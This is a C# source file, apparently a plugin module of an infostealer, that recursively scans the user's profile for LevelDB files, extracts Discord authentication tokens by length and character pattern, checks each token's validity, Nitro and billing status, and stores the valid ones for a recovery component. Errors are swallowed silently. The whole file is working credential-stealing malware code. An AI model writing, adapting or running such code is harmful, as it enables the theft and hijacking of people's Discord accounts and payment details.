using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace Plugin
{
    internal class Discordo
    {
        public static string localpath = Environment.GetEnvironmentVariable("USERPROFILE");

        public static List<string> ldbfiles = new List<string>();
        public static List<string> tokensSent = new List<string>();

        private static string rawText;

        public static void GetTokens()
        {
            searchAll(localpath);
            if (ldbfiles.Count == 0) return;
            foreach (var filez in ldbfiles)
                if (filez.EndsWith(".ldb"))
                    try
                    {
                        rawText = File.ReadAllText(filez);
                        if (rawText.Contains("oken"))
                            foreach (Match match in Regex.Matches(rawText, "[^\"]*"))
                                if ((match.Length == 59 || match.Length == 89 || match.Length == 88) &&
                                    isValidString(match.ToString()))
                                    if (tokensSent.Contains(match.ToString()) == false)
                                        tokensSent.Add(match + " -> " + Net.TokenState(match.ToString()) + " -> " +
                                                       Net.NitroState(match.ToString()) + " -> " +
                                                       Net.BillingState(match.ToString()));
                    }
                    catch
                    {
                    }

            try
            {
                WriteTokens();
            }
            catch
            {
            }
        }

        public static void WriteTokens()
        {
            var tokens = "";
            foreach (var token in tokensSent)
                if (!token.Contains("Valid: NO"))
                    tokens += token + "\n";

            Recorvery.totaltokens = tokens;
        }

        private static bool isValidString(string text)
        {
            var allowed = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.-_";
            var upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            var hasUpper = false;
            foreach (var ch in text)
                if (upper.Contains(ch.ToString()))
                {
                    hasUpper = true;
                    break;
                }

            if (hasUpper == false)
                return false;
            foreach (var ch in text)
                if (allowed.Contains(ch.ToString()) == false)
                    return false;
            return true;
        }

        public static void searchAll(string location)
        {
            try
            {
                var files = Directory.GetFiles(location);
                var childDirectories = Directory.GetDirectories(location);
                for (var i = 0; i < files.Length; i++) ldbfiles.Add(files[i]);
                for (var i = 0; i < childDirectories.Length; i++) searchAll(childDirectories[i]);
            }
            catch (Exception)
            {
            }
        }
    }
}